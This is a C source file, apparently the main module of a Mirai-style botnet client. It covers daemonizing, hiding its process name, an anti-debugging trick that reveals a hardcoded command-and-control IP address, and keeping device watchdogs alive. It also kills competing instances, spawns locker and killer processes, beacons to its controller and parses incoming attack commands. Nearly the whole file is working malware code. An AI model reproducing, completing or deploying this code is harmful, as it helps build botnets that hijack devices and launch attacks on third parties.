#define _GNU_SOURCE

#include <time.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <sys/socket.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/attack.h"
#include "headers/util.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void break_handler(void);
static void ensure_single_instance(void);

void Killer_Linker(void);
int locker_destroy(void);
void locker_init(void);
void ioctl_keepalive(void);

char SelfPath[256];
BOOL pending_connection = FALSE;
int fd_ctrl = -1, fd_serv = -1, check_con = 0;
int Locker_Pid = 0, Killer_Pid = 0, Ioctl_Pid = 0, Main_Pid = 0;

struct sockaddr_in srv_addr;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef IOCTL_K
void ioctl_keepalive()
{
    Ioctl_Pid = fork();
    if (Ioctl_Pid > 0 || Ioctl_Pid == -1)
        return;

    prctl(PR_SET_PDEATHSIG, SIGHUP);

    int timeout = 1, ioctl_fd = 0, found = FALSE;

    sec_toggle(TABLE_IOCTL_KEEPALIVE1);
    sec_toggle(TABLE_IOCTL_KEEPALIVE2);
    sec_toggle(TABLE_IOCTL_KEEPALIVE3);
    sec_toggle(TABLE_IOCTL_KEEPALIVE4);
    sec_toggle(TABLE_IOCTL_KEEPALIVE5);
    sec_toggle(TABLE_IOCTL_KEEPALIVE6);
    sec_toggle(TABLE_IOCTL_KEEPALIVE7);

    if ((ioctl_fd = open(sec_unwrap(TABLE_IOCTL_KEEPALIVE1, NULL), 2)) != -1 ||
        (ioctl_fd = open(sec_unwrap(TABLE_IOCTL_KEEPALIVE2, NULL), 2)) != -1 ||
        (ioctl_fd = open(sec_unwrap(TABLE_IOCTL_KEEPALIVE3, NULL), 2)) != -1 ||
        (ioctl_fd = open(sec_unwrap(TABLE_IOCTL_KEEPALIVE4, NULL), 2)) != -1 ||
        (ioctl_fd = open(sec_unwrap(TABLE_IOCTL_KEEPALIVE5, NULL), 2)) != -1 ||
        (ioctl_fd = open(sec_unwrap(TABLE_IOCTL_KEEPALIVE6, NULL), 2)) != -1 ||
        (ioctl_fd = open(sec_unwrap(TABLE_IOCTL_KEEPALIVE7, NULL), 2)) != -1)
    {

        // printf("[ioctl_call] found a driver on the drvice\n");
        found = TRUE;
        ioctl(ioctl_fd, 0x80045704, &timeout);
    }

    if (found)
    {
        while (TRUE)
        {

            // printf("[ioctl_call] sending keep-alive ioctl call to the driver\n");
            ioctl(ioctl_fd, 0x80045705, 0);
            sleep(10);
        }
    }

    sec_toggle(TABLE_IOCTL_KEEPALIVE1);
    sec_toggle(TABLE_IOCTL_KEEPALIVE2);
    sec_toggle(TABLE_IOCTL_KEEPALIVE3);
    sec_toggle(TABLE_IOCTL_KEEPALIVE4);
    sec_toggle(TABLE_IOCTL_KEEPALIVE5);
    sec_toggle(TABLE_IOCTL_KEEPALIVE6);
    sec_toggle(TABLE_IOCTL_KEEPALIVE7);

    // printf("[ioctl_call] driver not found.\n");
    exit(0);
}
#endif

int printthroughsocket(int sock, const char *fmt, ...)
{
    char buffer[4096];
    int len = 0;
    memset(buffer, 0, 4096);

    va_list args;
    va_start(args, fmt);
    vsprintf(buffer, fmt, args);
    va_end(args);

#ifdef debug
    printf("Sending: %s\n", buffer);
#endif
    len = strlen(buffer);
    return send(sock, buffer, len, MSG_NOSIGNAL);
}

char *arches()
{
#if defined(__x86_64__) || defined(_M_X64)
    return "x64";
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x32";
#elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "arm";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "arm5"
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "arm6";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "arm7";
#elif defined(mips) || defined(__mips__) || defined(__mips)
    return "mips";
#elif defined(mipsel) || defined(__mipsel__) || defined(__mipsel) || defined(_mipsel)
    return "mipsel";
#elif defined(__sh__)
    return "sh4";
#elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "ppc";
#elif defined(__sparc__) || defined(__sparc)
    return "spc";
#elif defined(__m68k__)
    return "m68k";
#elif defined(__arc__)
    return "arc";
#else
    return "unknown";
#endif
}

int main(int argc, char **args)
{
    // unlink(args[0]);
    chdir("/");
    setsid();

    char id_buf[32];
    int pgid = 0, pings = 0, j = 0;

    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, &anti_gdb_entry);

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    sec_init();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    int num = (rand() % (100 - 10 + 1)) + 10;
    for (j = 0; j < num; ++j)
    {
        args[0][j] = '\0';
    }
    num = 0;

    Main_Pid = getpid();

    anti_gdb_entry(0);
    ensure_single_instance();
    rand_init();

#ifndef DEBUG
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#elif DEBUG
    printf("[pid_main] %d\n", Main_Pid);
#endif
    attack_init();

#ifdef LOCKER
    locker_init();
#ifdef DEBUG
    printf("[pid_locker] %d\n", Locker_Pid);
#endif
#endif

#ifdef IOCTL_K
    ioctl_keepalive();
#ifdef DEBUG
    printf("[pid_ioctl]  %d\n", Ioctl_Pid);
#endif
#endif

#ifdef KILLER
    readlink("/proc/self/exe", SelfPath, 256);
    Killer_Linker();
#ifdef DEBUG
    printf("[pid_killer] %d\n", Killer_Pid);
#endif
#endif

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        timeo.tv_usec = 0;
        timeo.tv_sec = 1;

        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
        }

        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof(cli_addr);
            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
#endif

            kill(pgid * -1, 9);

            if (Locker_Pid != 0)
            {
                locker_destroy();
                kill(Locker_Pid, 9);
            }

            if (Killer_Pid != 0)
                kill(Killer_Pid, 9);

            if (Ioctl_Pid != 0)
                kill(Ioctl_Pid, 9);

            exit(0);
        }

        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("[main] timed out while connecting to handler\n");
#endif
                break_handler();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[main] error while connecting to handler code=%d\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;

                    sleep(30);
                    check_con++;

                    if (check_con == 86400) // 86400
                        break_handler();
                }
                else
                {
                    LOCAL_ADDR = util_local_addr();
                    sec_toggle(BOT_VERIFY_STRING);
                    printthroughsocket(fd_serv, "%s %s %s", sec_unwrap(BOT_VERIFY_STRING, NULL), arches(), id_buf);
                    sec_toggle(BOT_VERIFY_STRING);
#ifdef DEBUG
                    printf("[main] connected to handler\n");
#endif
                }
            }
        }

        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] lost connection with handler (errno = %d) 1\n", errno);
#endif
                check_con = 0;
                establish_connection();
                continue;
            }

            if (len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }

            len = ntohs(len);
            if (len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] lost connection with handler (errno = %d) 2\n", errno);
#endif
                break_handler();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf("[main] received %d bytes from handler\n", len);
#endif
            if (len > 0)
            {
                attack_parse(rdbuf, len);
            }
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    sec_toggle(TABLE_CNC_PORT);

    srv_addr.sin_addr.s_addr = INET_ADDR(91,92,254,173);
    srv_addr.sin_port = *((port_t *)sec_unwrap(TABLE_CNC_PORT, NULL));

    sec_toggle(TABLE_CNC_PORT);
}

static void establish_connection(void)
{
#ifdef DEBUG
    printf("[main] attempting to connect to handler\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[main] failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void break_handler(void)
{
#ifdef DEBUG
    printf("[main] tearing down connection to handler!\n");
    printf("[pid_locker] %d\n", Locker_Pid);
    printf("[pid_killer] %d\n", Killer_Pid);
    printf("[pid_ioctl]  %d\n", Ioctl_Pid);
#endif

    locker_destroy();
    kill(Locker_Pid, 9);
    kill(Killer_Pid, 9);
    kill(Ioctl_Pid, 9);

    if (fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
    exit(0);
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;

    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127, 0, 0, 1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

        sleep(5);
        close(fd_ctrl);
        ensure_single_instance();
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to call listen() on fd_ctrl\n");
#endif
        }
#ifdef DEBUG
        printf("[main] We are the only process on this system!\n");
#endif
    }
}
